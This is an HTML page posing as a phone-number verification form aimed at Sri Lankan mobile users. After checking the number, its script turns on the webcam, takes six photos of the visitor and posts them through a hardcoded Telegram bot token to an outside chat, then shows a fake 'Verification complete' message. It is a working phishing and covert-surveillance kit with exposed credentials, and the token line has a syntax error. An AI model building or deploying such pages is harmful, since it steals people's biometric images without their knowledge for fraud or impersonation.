<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Verify Your Phone</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: 'Poppins', sans-serif;
      color: #eee;
      overflow: hidden;
    }
    body::before {
      content: "";
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.6);
      z-index: 1;
    }
    video#bgVideo {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      z-index: 0;
    }
    .container {
      position: relative;
      z-index: 2;
      background: rgba(31, 31, 31, 0.88);
      padding: 35px 30px;
      border-radius: 18px;
      max-width: 420px;
      width: 90%;
      box-shadow: 0 0 30px #6200ea44;
      text-align: center;
      margin: 5% auto;
    }
    h2 {
      margin-bottom: 28px;
      font-weight: 600;
      font-size: 26px;
      color: #bb86fc;
    }
    .input-group {
      margin-bottom: 18px;
      text-align: left;
    }
    label {
      display: block;
      font-weight: 600;
      font-size: 14px;
      margin-bottom: 6px;
      color: #ccc;
    }
    select, input[type="tel"] {
      width: 100%;
      padding: 12px 14px;
      border-radius: 12px;
      background: #2a2a2a;
      border: none;
      color: #eee;
      font-size: 16px;
      box-shadow: inset 0 0 6px #000;
    }
    select:focus, input[type="tel"]:focus {
      outline: none;
      box-shadow: 0 0 12px #bb86fc;
    }
    button {
      background: linear-gradient(45deg, #7b2ff7, #f107a3);
      border: none;
      padding: 14px;
      width: 100%;
      border-radius: 14px;
      font-size: 18px;
      font-weight: 700;
      color: white;
      cursor: pointer;
      box-shadow: 0 0 20px #bb86fcaa;
    }
    button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 30px #bb86fcff;
    }
    .error {
      margin-top: 16px;
      font-size: 15px;
      font-weight: 600;
      color: #ff5252;
      text-shadow: 0 0 8px #ff5252aa;
      opacity: 0;
      transform: translateY(12px);
      transition: all 0.3s ease;
    }
    .error.show {
      opacity: 1;
      transform: translateY(0);
      animation: shake 0.4s;
    }
    @keyframes shake {
      0% { transform: translateX(0); }
      25% { transform: translateX(-6px); }
      50% { transform: translateX(6px); }
      75% { transform: translateX(-6px); }
      100% { transform: translateX(0); }
    }
    #progress {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.75);
      z-index: 99;
      color: white;
      display: none;
      justify-content: center;
      align-items: center;
      font-size: 20px;
      font-weight: 600;
    }
  </style>
</head>
<body>

<video id="bgVideo" autoplay muted loop playsinline>
  <source src="video.mp4" type="video/mp4">
</video>

<div class="container">
  <h2>üì± Verify Phone</h2>

  <div class="input-group">
    <label for="country">Select Country Code</label>
    <select id="country">
      <option value="+94">üá±üá∞ Sri Lanka (+94)</option>
      <option value="+91">üáÆüá≥ India (+91)</option>
      <option value="+1">üá∫üá∏ USA (+1)</option>
      <option value="+44">üá¨üáß UK (+44)</option>
      <option value="+65">üá∏üá¨ Singapore (+65)</option>
    </select>
  </div>

  <div class="input-group">
    <label for="sim">Select SIM Connection</label>
    <select id="sim">
      <option value="">-- Select your SIM --</option>
      <option>Dialog</option>
      <option>Mobitel</option>
      <option>Airtel</option>
      <option>Hutch</option>
    </select>
  </div>

  <div class="input-group">
    <label for="phone">Phone Number</label>
    <input type="tel" id="phone" placeholder="Enter number" />
  </div>

  <button onclick="validateNumber()">Verify</button>
  <div class="error" id="errorMsg"></div>
</div>

<div id="progress">üì∏ Capturing face... please wait</div>

<video id="video" autoplay playsinline muted style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
const validationRules = {
  "+94": /^[1-9][0-9]{8}$/,
  "+91": /^[6-9][0-9]{9}$/,
  "+1": /^[2-9][0-9]{9}$/,
  "+44": /^[1-9][0-9]{9}$/,
  "+65": /^[89][0-9]{7}$/
};

const botToken = "8132954067:AAF4LrTgvWQer8pwDqpevWb9_9a1FPbz0SY;
const chatId = "8182050140";

function validateNumber() {
  const code = document.getElementById('country').value;
  const sim = document.getElementById('sim').value;
  const phone = document.getElementById('phone').value.trim();
  const error = document.getElementById('errorMsg');
  error.classList.remove("show");
  error.textContent = "";

  if (!sim) {
    error.textContent = "‚ùó Select your SIM.";
    error.classList.add("show");
    return;
  }
  if (!phone) {
    error.textContent = "üìµ Enter phone number.";
    error.classList.add("show");
    return;
  }
  if (!validationRules[code].test(phone)) {
    error.textContent = `‚ùå Invalid number for ${code}`;
    error.classList.add("show");
    return;
  }

  document.getElementById('progress').style.display = "flex";
  startCapture();
}

async function startCapture() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    video.srcObject = stream;

    for (let i = 1; i <= 6; i++) {
      await new Promise(res => setTimeout(res, 1500));
      captureAndSend(i);
    }

    setTimeout(() => {
      stream.getTracks().forEach(t => t.stop());
      document.getElementById('progress').style.display = "none";
      alert("‚úÖ Verification complete.");
    }, 1500 * 6 + 500);
  } catch (err) {
    document.getElementById('progress').style.display = "none";
    alert("‚ùå Camera permission denied. Please allow access from browser settings.");
  }
}

function captureAndSend(count) {
  const canvas = document.getElementById("canvas");
  const video = document.getElementById("video");
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  const data = canvas.toDataURL("image/jpeg");
  sendToTelegram(data, count);
}

function sendToTelegram(dataUrl, count) {
  const blob = dataURItoBlob(dataUrl);
  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("photo", blob, `face${count}.jpg`);

  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: "POST",
    body: form
  });
}

function dataURItoBlob(dataURI) {
  const byteString = atob(dataURI.split(',')[1]);
  const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }
  return new Blob([ab], { type: mimeString });
}
</script>

</body>
</html>
